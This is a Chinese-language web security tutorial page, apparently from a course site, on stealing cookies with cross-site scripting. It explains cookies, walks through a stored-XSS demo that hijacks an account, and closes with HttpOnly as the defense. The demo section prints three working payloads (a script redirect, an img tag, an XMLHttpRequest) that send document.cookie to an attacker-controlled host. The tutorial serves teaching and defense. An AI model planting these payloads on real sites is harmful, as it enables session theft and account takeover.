<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"/>
        
        
        
        <link rel="shortcut icon" href="../../../img/favicon.ico">
        <title>Stealing Cookie With XSS - Web Security </title>

        <link href="../../../css/prism.css" type="text/css" rel="stylesheet" media="screen,projection"/>
        <link href="../../../css/materialize.css" type="text/css" rel="stylesheet" media="screen,projection"/>
        <link href="../../../css/base.css" type="text/css" rel="stylesheet" media="screen,projection"/>

        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
            <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
        <![endif]-->

        
    </head>

    <body>

        <div class="navbar-fixed">
<nav class="blue lighten-1" role="navigation">
    <div class="nav-wrapper container">
    <a id="logo-container" href="../../.." class="brand-logo center">Web Security</a>
    <ul class="right hide-on-med-and-down">
        <li >
            <a rel="next" href="../Overview">
                <i class="mdi-hardware-keyboard-arrow-left left"></i> Previous
            </a>
        </li>
        <li >
            <a rel="prev" href="../CSS-history-hack">
                Next <i class="mdi-hardware-keyboard-arrow-right right"></i>
            </a>
        </li>

      </ul>
    <ul id="slide-out" class="side-nav">
    
    
        <li class="no-padding active">
            <ul class="collapsible collapsible-accordion">
            <li class="bold">
                <a href="javascript:void(0)" class="collapsible-header waves-effect waves-teal">XSS</a>
                <div class="collapsible-body">
                    <ul>
                    
                        <li >
                            <a href="../Overview" class="truncate">XSS</a>
                        </li>
                    
                        <li class="active">
                            <a href="." class="truncate">Stealing Cookie With XSS</a>
                        </li>
                    
                        <li >
                            <a href="../CSS-history-hack" class="truncate">CSS History Hack</a>
                        </li>
                    
                        <li >
                            <a href="../XSS-Worm" class="truncate">XSS Worm</a>
                        </li>
                    
                        <li >
                            <a href="../XSS-Defense" class="truncate">XSS Defense</a>
                        </li>
                    
                    </ul>
                </div>
            </li>
            </ul>
        </li>
    
    
    
        <li class="no-padding">
            <ul class="collapsible collapsible-accordion">
            <li class="bold">
                <a href="javascript:void(0)" class="collapsible-header waves-effect waves-teal">Browser Security</a>
                <div class="collapsible-body">
                    <ul>
                    
                        <li >
                            <a href="../../Browser_Security/Same-Origin-Policy" class="truncate">Same Origin Policy</a>
                        </li>
                    
                        <li >
                            <a href="../../Browser_Security/Browser-Sandbox" class="truncate">Browser Sandbox</a>
                        </li>
                    
                        <li >
                            <a href="../../Browser_Security/Malicious-URL-interception" class="truncate">Malicious URL interception</a>
                        </li>
                    
                    </ul>
                </div>
            </li>
            </ul>
        </li>
    
    
    
        <li class="no-padding">
            <ul class="collapsible collapsible-accordion">
            <li class="bold">
                <a href="javascript:void(0)" class="collapsible-header waves-effect waves-teal">Web服务配置安全</a>
                <div class="collapsible-body">
                    <ul>
                    
                        <li >
                            <a href="../../Web_Server_Sercurity/Web-Server-Sercurity" class="truncate">Web Server Sercurity</a>
                        </li>
                    
                        <li >
                            <a href="../../Web_Server_Sercurity/Apache2-WAF" class="truncate">Apache2 ModSecurity</a>
                        </li>
                    
                    </ul>
                </div>
            </li>
            </ul>
        </li>
    
    
    
        <li class="no-padding">
            <ul class="collapsible collapsible-accordion">
            <li class="bold">
                <a href="javascript:void(0)" class="collapsible-header waves-effect waves-teal">SQL_injection</a>
                <div class="collapsible-body">
                    <ul>
                    
                        <li >
                            <a href="../../SQL_injection/Overview" class="truncate">Overview</a>
                        </li>
                    
                        <li >
                            <a href="../../SQL_injection/SQL_injection" class="truncate">SQL_injection</a>
                        </li>
                    
                        <li >
                            <a href="../../SQL_injection/SQL_injection_defence" class="truncate">SQL_injection defence</a>
                        </li>
                    
                    </ul>
                </div>
            </li>
            </ul>
        </li>
    
    
    
        <li class="no-padding">
            <ul class="collapsible collapsible-accordion">
            <li class="bold">
                <a href="javascript:void(0)" class="collapsible-header waves-effect waves-teal">Clickjacking</a>
                <div class="collapsible-body">
                    <ul>
                    
                        <li >
                            <a href="../../Clickjacking/Overview" class="truncate">Overview</a>
                        </li>
                    
                        <li >
                            <a href="../../Clickjacking/Click_Jacking" class="truncate">Click_Jacking</a>
                        </li>
                    
                        <li >
                            <a href="../../Clickjacking/Click_Jacking_defence" class="truncate">Click Jacking defence</a>
                        </li>
                    
                    </ul>
                </div>
            </li>
            </ul>
        </li>
    
    
    
        <li class="no-padding">
            <ul class="collapsible collapsible-accordion">
            <li class="bold">
                <a href="javascript:void(0)" class="collapsible-header waves-effect waves-teal">CSRF</a>
                <div class="collapsible-body">
                    <ul>
                    
                        <li >
                            <a href="../../CSRF/Overview" class="truncate">CSRF</a>
                        </li>
                    
                        <li >
                            <a href="../../CSRF/CSRF_Attack" class="truncate">CSRF Attack</a>
                        </li>
                    
                        <li >
                            <a href="../../CSRF/CSRF_Defense" class="truncate">CSRF Defense</a>
                        </li>
                    
                    </ul>
                </div>
            </li>
            </ul>
        </li>
    
    
    
        <li class="no-padding">
            <ul class="collapsible collapsible-accordion">
            <li class="bold">
                <a href="javascript:void(0)" class="collapsible-header waves-effect waves-teal">Web框架安全</a>
                <div class="collapsible-body">
                    <ul>
                    
                        <li >
                            <a href="../../Web_framework/Overview" class="truncate">Web框架安全概述</a>
                        </li>
                    
                        <li >
                            <a href="../../Web_framework/XSS" class="truncate">模板引擎与XSS防御</a>
                        </li>
                    
                        <li >
                            <a href="../../Web_framework/csrf" class="truncate">Web框架与CSRF防御</a>
                        </li>
                    
                    </ul>
                </div>
            </li>
            </ul>
        </li>
    
    
    
        <li class="no-padding">
            <ul class="collapsible collapsible-accordion">
            <li class="bold">
                <a href="javascript:void(0)" class="collapsible-header waves-effect waves-teal">拒绝服务攻击</a>
                <div class="collapsible-body">
                    <ul>
                    
                        <li >
                            <a href="../../DOS/Overviewed" class="truncate">DOS攻击原理</a>
                        </li>
                    
                        <li >
                            <a href="../../DOS/general-dos" class="truncate">通用的DoS攻击技术</a>
                        </li>
                    
                    </ul>
                </div>
            </li>
            </ul>
        </li>
    
    
    
        <li class="no-padding">
            <ul class="collapsible collapsible-accordion">
            <li class="bold">
                <a href="javascript:void(0)" class="collapsible-header waves-effect waves-teal">Access_Control</a>
                <div class="collapsible-body">
                    <ul>
                    
                        <li >
                            <a href="../../Access_Control/Overview" class="truncate">Access_Control</a>
                        </li>
                    
                        <li >
                            <a href="../../Access_Control/DAC" class="truncate">DAC</a>
                        </li>
                    
                        <li >
                            <a href="../../Access_Control/MAC" class="truncate">MAC</a>
                        </li>
                    
                        <li >
                            <a href="../../Access_Control/RBAC" class="truncate">RBAC</a>
                        </li>
                    
                    </ul>
                </div>
            </li>
            </ul>
        </li>
    
    

    </ul>
      <a href="javascript:void(0)" data-activates="slide-out" class="button-collapse show-on-large"><i class="mdi-navigation-menu"></i></a>
    </div>
  </nav>
</div>

        <div class="container">
            <div class="row">
                <div class="col s12 m3"><div class="hide-on-small-only index">
  <ul class="section table-of-contents">
    
        <li class="main active"><a href="#stealing-cookie-with-xss">Stealing Cookie With XSS</a></li>
        
            <li><a href="#cookie">Cookie 介绍</a></li>
        
            <li><a href="#cookie_1">Cookie 的作用</a></li>
        
            <li><a href="#cookie_2">Cookie 操作</a></li>
        
            <li><a href="#cookie_3">Cookie 的安全</a></li>
        
            <li><a href="#xss">XSS攻击演示</a></li>
        
            <li><a href="#cookie_4">Cookie 攻击防范</a></li>
        
    
  </ul>
</div></div>
                <div class="col s12 m9" role="main"><h1 id="stealing-cookie-with-xss">Stealing Cookie With XSS</h1>
<p>利用XSS窃取客户端资料</p>
<hr />
<h2 id="cookie">Cookie 介绍</h2>
<p>简单来说，Cookie 是用户浏览网页时网站存储在用户机器上的小文本文件，文件里面记录了与用户相关的一些状态或者设置，比如用户名、ID、访问次数等，当用户下一次
访问这个网站的是，浏览器会把Cookie 信息发送给网站，网站从中读取信息，以便用户实现快速访问。</p>
<h2 id="cookie_1">Cookie 的作用</h2>
<p>因为HTTP协议是无状态的，即服务器不知道用户上一次做了什么，这严重阻碍了交互式Web应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么。 所以Cookie就是用来绕开HTTP的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。</p>
<p>在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。</p>
<p>Cookie另一个典型的应用是当登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。第二次登录时，（如果该Cookie尚未到期）浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。</p>
<h2 id="cookie_2">Cookie 操作</h2>
<p>通常我们需要设置一些 Cookie 属性，常见属性如下：</p>
<pre><code>    Domain——设置关联 Cookie 的域名;
    Expires——通过给定一个过期时间来创建一个持久化Cookie;
    HttpOnly——用于避免Cookie 被 JavaScript 访问;
    Name——Cookie 的名称;
    Path——关联到 Cookie 的路径，默认为/;
    Value——读写Cookie的值;
    Secure——用于指定Cookie 需要通过安全 Socket 层连接传递;
</code></pre>
<p>创建一个 Cookie，需要提供 Cookie的名字、对应值、过期时间和相关路径等，以PHP语言为例，使用<a href="http://php.net/manual/en/function.setcookie.php">setcookie()</a> 函数能轻易创建一个 Cookie，例如：</p>
<pre><code>    &lt;?
    setcookie('user_id',123);  //创建一个Cookie变量 user_id=123
    ?&gt;
</code></pre>
<p>若要删除 Cookie，设定 Cookie 的Expires 的值为过去时间即可：</p>
<pre><code>    setcookie('user_id',0,time()-1); //删除 Cookie 变量
</code></pre>
<h2 id="cookie_3">Cookie 的安全</h2>
<p>由于 Cookie 保存在客户端，这意味着它随时可能被窃取和滥用，如果我们登录百度后没有退出帐号，当其他成员使用同一台计算机登录时，利用之前的 Cookie，就能窃取我们帐号的“权限”。</p>
<p>例如使用Chrome的开发者工具查看 Cookie 信息：</p>
<p><img alt="Cookie" src="../../../img/Cookie.png" /></p>
<h2 id="xss">XSS攻击演示</h2>
<p>接下来我就通过实际的攻击演示来告诉大家如何窃取Cookie并获取帐号的“权限”。</p>
<p>攻击者可以使用下面三种方式获取客户端的Cookie信息：</p>
<pre><code>    &lt;script&gt;
    document.location="http://www.test.com/cookie.asp?cookie="+document.cookie
    &lt;/script&gt;

    &lt;img src="http://www.test.com/cookie.asp?cookie=+'document.cookie'"&gt;&lt;/img&gt;

    var http = new XMLHttpRequest();
    http.open("GET", "http://localhost:2002?cookie="+encodeURIComponent(document.cookie), true);
    http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    http.send();
</code></pre>
<p>上面攻击的本质都是触发一个HTTP GET 请求把 Cookie 信息作为URL的一部分参数传给攻击者的服务器然后攻击者
通过查看日志即可获取到 Cookie 信息，对于包含特殊字符的Cookie信息可以使用<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent">encodeURIComponent</a>函数进行编码传输。</p>
<p>首先把XSS攻击代码保存到用户的Profile中：</p>
<p><img alt="XSS save" src="../../../img/xss-1.png" /></p>
<p>然后通过查看Profile触发XSS代码：</p>
<p><img alt="XSS trige" src="../../../img/xss-2.png" /></p>
<p>然后通过开发者工具的Network面板查看到确实构造了一个带有 Cookie 信息的GET请求：</p>
<p><img alt="XSS get" src="../../../img/xss-3.png" /></p>
<p>2002端口是本地的查看GET请求的服务器用来捕捉请求：</p>
<p><img alt="XSS get" src="../../../img/xss-4.png" /></p>
<p>接下来打开一个隐身窗口（隐身窗口不会使用正常浏览的Cookie，所以可以模拟新用户）。然后通过注入Cookie的方式来完成模拟被盗用户
的登录。默认会被跳转到登录页面，因为没有登录嘛。</p>
<p><img alt="XSS open" src="../../../img/xss-5.png" /></p>
<p>接下来打开开发者工具的Console页面,把得到的Cookie进行如下操作之后刷新页面就会发现：</p>
<p><img alt="XSS console" src="../../../img/xss-6.png" /></p>
<p>我们已经登录到这个用户的账户了：</p>
<p><img alt="XSS success" src="../../../img/xss-7.png" /></p>
<h2 id="cookie_4">Cookie 攻击防范</h2>
<p>对于 Cookie 的偷取我们可以使用最有效的方法：设置Cookie的HttpOnly为true，这样JavaScript就无法访问了。</p>
<p>设置了HttpOnly属性之后在开发者工具里面可以看到HTTP选项已经打勾：</p>
<p><img alt="XSS HttpOnly" src="../../../img/xss-8.png" /></p>
<p>可以看到监听服务器并没有获取到Cookie：</p>
<p><img alt="XSS Cookie" src="../../../img/xss-9.png" /></p>
<p>这样就有效避免了Cookie被盗用的风险～</p>
</div>
            </div>
        </div>
        <footer  class="page-footer transparent">
    <div class="footer-copyright">
      <div class="container center">
        
            <span>Copyright &copy; 2015, <a href="https://github.com/acgotaku/WebSecurity">CSS WebSecurity</a>.</span>
        
      </div>
    </div>
        </footer>

        <script src="../../../js/jquery-2.1.1.min.js"></script>
        <script src="../../../js/prism.js"></script>
        <script src="../../../js/materialize.js"></script>
        <script src="../../../js/init.js"></script>
    </body>
</html>